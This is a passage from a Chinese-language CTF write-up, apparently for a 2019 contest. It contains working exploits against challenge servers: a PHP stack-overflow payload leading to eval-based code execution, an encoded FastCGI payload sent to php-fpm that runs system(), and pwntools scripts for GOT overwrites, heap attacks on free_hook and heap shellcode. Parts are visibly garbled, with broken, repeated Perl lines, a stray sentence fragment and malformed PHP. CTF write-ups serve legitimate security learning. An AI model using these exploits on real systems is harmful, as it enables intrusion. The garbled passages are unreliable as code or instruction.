    $stack[$ebp] = $ebp + $rand2;
        $rand3 = rand(0x20, 0x60);
    $esp = $ebp - $rand3 * 0x4;
    $stack[$ebp + 0x4] = dechex($phpinfo_addr);
    $post_data  = str_repeat('aaaa', $rand3 - 1);           // 填充到 canary 前一个空间
    $post_data .= hex2bin(strrev($canary));                 // 补上 canary
    $post_data .= 'Rebp';                                   // random ebp
    $bad_addr = array_search('create_function', $plt);
    $post_data .= recover_data(dechex($bad_addr));          // function addr
    $post_data .= "2\x00\x00\x00";                          // create_function 需要两个参数
    $post_data .= 'aaaa';                                   // 参数1
    $post_data .= 'bbbb';                                   // 参数2
    $post_data .= str_repeat('A', 400);
    $data = $bad_addr.'=1&data=' . urlencode($post_data);
    var_dump($data);
    function post($url, $data){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
    }
    var_dump post('http://34.85.27.91:10080?cccc='.urlencode($_REQUEST['x']).'&xxxx='.urlencode($_REQUEST['a']).'&aaaa=&bbbb=1;}eval($_GET[cccc]);/*', $data));
现在可以RCE了，但是绕不过`disable_functions`。此时看他`Dockerfile`和`run.sh`。
run.sh:
    #!/bin/sh
    service --status-all | awk '{print $4}'| xargs -i service {} start sleep infinity;
Dockerfile:
    RUN apt-cache search "php" | grep "php7.3"| awk '{print $1}'| xargs apt-get -y install
怎么说呢，其实有种强行出题的感觉。题目安装了所有PHP的扩展，自然也包括`php7.3-fpm`。在`run.sh`里还启用了所有服务，因此SSRF打fpm即可。
我们想让SSRF来帮我们跑：
    ;print STDOUT $reply; $reply = ;print STDOUT $reply; my $answer = eval($reply);print in2 " $answer "; in2->flush();$reply = ;print STDOUT $reply;print STDOUT $reply;$reply = ;print STDOUT $reply;$reply = ;print STDOUT $reply;\'');
先压缩一下：
    ;print STDOUT $reply; $reply = ;print STDOUT $reply; my $answer = eval($reply);print in2 " $answer "; in2->flush();$reply = ;print STDOUT $reply;print STDOUT $reply;$reply = ;print STDOUT $reply;$reply = ;print STDOUT $reply;\''));
然后丢进system：
     中的脚本，只保留其生成功能，去除其发包功能，得到以下payload:
    AQE2ugAIAAAAAQAAAAAAAAEENroB3AAADgNDT05URU5UX0xFTkdUSDI4MwwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4dAsEUkVNT1RFX1BPUlQ5OTg1CwlTRVJWRVJfTkFNRWxvY2FsaG9zdBELR0FURVdBWV9JTlRFUkZBQ0VGYXN0Q0dJLzEuMA8OU0VSVkVSX1NPRlRXQVJFcGhwL2ZjZ2ljbGllbnQLCVJFTU9URV9BRERSMTI3LjAuMC4xDxdTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocAsXU0NSSVBUX05BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocAkfUEhQX1ZBTFVFYXV0b19wcmVwZW5kX2ZpbGUgPSBwaHA6Ly9pbnB1dA4EUkVRVUVTVF9NRVRIT0RQT1NUCwJTRVJWRVJfUE9SVDgwDwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwAUVVFUllfU1RSSU5HDxZQSFBfQURNSU5fVkFMVUVhbGxvd191cmxfaW5jbHVkZSA9IE9uDQFET0NVTUVOVF9ST09ULwsJU0VSVkVSX0FERFIxMjcuMC4wLjELF1JFUVVFU1RfVVJJL3Zhci93d3cvaHRtbC9pbmRleC5waHABBDa6AAAAAAEFNroBGwAAPD9waHAgc3lzdGVtKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCJqWTdCQ3NJd0RJWmZKUlRCVlp6REhWZjFvaGRQRTlRSEtGdmNDclVyYWFjSVByenRISjQ4N0JLUy8vLytKQlpKUTRvdzd4M0NVNUpScG5FaURzNlRxdnpRSGsvN29pZ3RtbHpNM3JDRnRhamFXbEhDTXNiRi9RVXpxK29nZDVGSUZsM3Y4eVVzbEFtVnJUSkNXZCswYkJpSGpxQldPQ1FJclg2RnpDYlNPMkZKR1Evbnk2RzhYa1pUVElQaU1tbmNFeW1BK0pBNitUcDh4TU1id0g0SUUxRklkemZkdXpiaFlzcUpmOXFVM0JSbS9nRT0iKSkpOwEFNroAAAAACg==
之后让PHP连上php-fpm.sock并发将payload发过去即可：
     1 0
    ^ 1 0 => 1 1
所以问题转化成如何使倒数第二位为1  
这里采用的方式是 X Y  
& X Y  
| X Y  
如果 Y 在运算后 依然为1, 则 X 必定为1. 写出流程
    03    &
    04    |
    01    IF
    13    False Jmp 7
    00    True  Save to out
    05    ^
    33    JMP 4
    02    POP
    39    JMP 0
exp
    from pwn import *
    import re
    import hashlib
    from base64 import b64encode
    string.ascii_letters+string.digits
    def solve_pow(arg1, arg2):
        print (arg1, arg2)
        for i0 in string.ascii_letters+string.digits:
            for i1 in string.ascii_letters+string.digits:
                for i2 in string.ascii_letters+string.digits:
                    for i3 in string.ascii_letters+string.digits:
                        i = i0+i1+i2+i3
                        hash = hashlib.sha256()
                        hash.update(str(i) + arg1.encode('utf-8'))
                        tmp = hash.hexdigest()
                        if tmp == arg2:
                            print (str(i))
                            return str(i)
    p = remote("34.92.185.118","10002")
    data = p.recvuntil('Give me XXXX:')
    print(data)
    regex = r"\+(.*)\) == (.*)"
    test_str = data
    matches = re.finditer(regex, test_str, re.MULTILINE)
    for matchNum, match in enumerate(matches, start=1):
        p.sendline(solve_pow(match.group(1), match.group(2)))
        print(match.group(1), match.group(2))
    print(p.recvuntil('opcode(hex):'))
    p.sendline('030401130005330239')
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())
### babyprng2
与第一题类似. 多了一个队列, 并且每次保存都会出栈, 不能像第一题无脑循环.  
按 题1 思路, 依然是需要一个 1.  
有以下循环
    | 1 ? => 1 1
    两次后可以得到 1 1 1
    1 1 1 出 1
    | 1 1 => 1 0 出 0
    1 跳到第一步
最后payload为
    01111206350606080306013606060803000400053a
## Misc
### She
使用cheat engine工具  
修改存档打败boss后
9个房间每次开一个只能打开一个门，有一个bad
door在touch后不能打开其他门，经测试在3号门得到数字3，在8号门得到数字7，在2号门得到数字1，在1号门得到数字2，在5号门得到数字6，在7号门得到数字9，9号门是bad
door。剩下两个门打不开。得到六个数字后可进入一个房间，找到镜子。
人在镜子右边，说的是md5 decrypt  
后来发现人站在镜子左边  
镜子说的话又变了
猜测右边的是迷惑人的。  
按得到的数字371269加密后发现不对，根据题目提示，Please combine numbers in the order of the
rooms，改为213697进行md5加密，得到flag.
### otaku
ichunqiu级别，无语凝噎。  
`binwalk
-e`直接解zip，把doc转docx接着解压提取出里面的隐藏字符，用GBK保存到文本文件。之后已知明文攻击提取密码My_Waifu，最后LSB隐写。
## pwn
### quick sort
#### 利用思路：
gets覆盖ptr，导致任意写，修改free@got为main，将ptr修改为可泄露地址进行泄露，再次执行劫持`atoi@got`为`system`
    from pwn import *
    def main():
        # gdb.attach(p,"b *0x080488ED")
        # set free --> main
        got_free = 0x804a018
        main_addr = 0x80489C9
        payload = str(main_addr)
        payload = payload.ljust(16,"\x00")
        payload += p32(1)+p32(0)*2+p32(got_free)
        p.recvuntil("how many numbers do you want to sort?")
        p.sendline("1")
        p.recvuntil("the 1th number:")
        p.sendline(payload)
        #leak libc
        stderr = 0x804a060
        p.recvuntil("how many numbers do you want to sort?")
        p.sendline("2")
        p.recvuntil("the 1th number:")
        payload = "-"+str(0x7fffffff)
        payload = payload.ljust(16,"\x00")
        payload += p32(2)+p32(0)*2+p32(stderr-4)
        p.sendline(payload)
        p.recvuntil("the 2th number:")
        payload = "0"
        payload = payload.ljust(16,"\x00")
        payload += p32(2)+p32(11)*2+p32(stderr)
        p.sendline(payload)
        p.recvuntil("Here is the result:\n")
        libc_base = int(p.recvuntil(" ",drop=True))+0x100000000-0x1b2cc0
        info("libc : " + hex(libc_base))
        #atoi --> system
        p.recvuntil("how many numbers do you want to sort?")
        p.sendline("1")
        p.recvuntil("the 1th number:")
        payload = str(libc.symbols["system"]+libc_base-0x100000000)
        payload = payload.ljust(16,"\x00")
        payload += p32(1)+p32(0)*2+p32(elf.got["atoi"])
        p.sendline(payload)
        p.recvuntil("how many numbers do you want to sort?")
        p.sendline("1")
        p.recvuntil("the 1th number:")
        p.sendline("/bin/sh")
        p.interactive()
    if __name__ == "__main__":
        # p = process("./quicksort",env={"LD_PRELOAD":"./libc.so.6"})
        p = remote("34.92.96.238","10000")
        # p = process("./quicksort")
        elf = ELF("./quicksort")
        libc = ELF("./libc.so.6")
        main()
### grilfriend
    #coding:utf-8
    from pwn import *
    # context.log_level = 'debug'
    local = 0
    libc_path = "./lib/libc.so.6"
    if local:
        p = process("./chall_patch",env={"LD_PRELOAD":libc_path})
        context.binary = "./chall_patch"
        elf = context.binary
        libc = elf.libc
    else:
        p = remote("34.92.96.238", 10001)
        libc = ELF(libc_path)
    def new(size,content):
        p.sendlineafter("Input your choice:",'1')
        p.recvuntil("name\n")
        p.sendline(str(size))
        p.recvuntil("name:\n")
        p.sendline(content)
        p.recvuntil("call:\n")
        p.sendline('0'*11)
    def show(index):
        p.recvuntil("choice:")
        p.sendline('2')
        p.recvuntil("index:\n")
        p.sendline(str(index))
    def delete(index):
        p.recvuntil("choice:")
        p.sendline('4')
        p.recvuntil("index:\n")
        p.sendline(str(index))
    chunk_list = 0x202060
    new(0x500,'a'*8)
    new(0x60,'b'*8)
    new(0x60,'b'*8)
    new(0x60,'b'*8)
    new(0x60,'b'*8)
    delete(0)
    show(0)
    libc_base = (u64(p.recvuntil("phone:",drop=True)[-7:-1].ljust(8,"\x00"))) - 0x3b1ca0
    success("libc_base->{:#x}".format(libc_base))
    delete(1)
    delete(3)
    show(3)
    heap_base = u64(p.recvuntil("phone:",drop=True)[-7:-1].ljust(8,"\x00")) - 0x7b0
    success("heap_base->{:#x}".format(heap_base))
    for i in range(10):
        new(0x68,'a'*8)
    for i in range(10):
        delete(i+4)
    delete(12)
    #-------------    for i in range(7):
        new(0x68,'a')
    new(0x68,p64(libc_base + 0x3b38c8))  ##free_hook
    new(0x68,"/bin/sh\x00")
    new(0x68,p64(libc_base + 0x41c30))  ## system
    # gdb.attach(p,'''b malloc\nb free\nb* $0xF87''')
    new(0x68, p64(libc_base + 0x41c30))
    delete(13)
    p.interactive()
### upxofcpp
**思路**  
upx加壳，主程序空间可读可写可执行  
free的时候没有清空指针  
node结构体中存在指向函数调用的 _func_table,通过构造使得_
func_table指到堆，使得*func_table的show函数指向堆上，在show函数指向的堆上构造shellcode
    from pwn import *
    context.update(os='linux', arch='amd64')
    # p = process('./upxofcpp',env = {'LD_PRELOAD':'./libc-2.23.so'})
    p = remote('34.92.121.149', 10000)
    def new(idx,size,intg):
        string = ''
        p.sendlineafter('Your choice:','1')
        p.sendlineafter('Index:',str(idx))
        p.sendlineafter('Size:',str(size))
        for i in range(size):
            string += str(intg)+'\n'
        print string
        p.sendafter('Input '+str(size)+' integers, -1 to stop:',string)
    def free(idx):
        p.sendlineafter('Your choice:','2')
        p.sendlineafter('vec index:',str(idx))
    def show(idx):
        p.sendlineafter('Your choice:','4')
        p.sendlineafter('index:',str(idx))
    new(0,2,2)
    p.sendlineafter('Your choice:','1')
    p.sendlineafter('Index:','1')
    p.sendlineafter('Size:',str(6))
    '''
    push rax
    pop rsi
    push rcx
    push rcx
    pop rax
    pop rdi
    syscall
    '''
    payload = '0\n'*2 + str(0x51515e50)+'\n' + str(0x53415f58)+'\n' + str(0x00050f5a) +'\n' + str(0xdead)+'\n'
    p.sendafter('Input 6 integers, -1 to stop:',payload)
    new(2,2,2)
    free(1)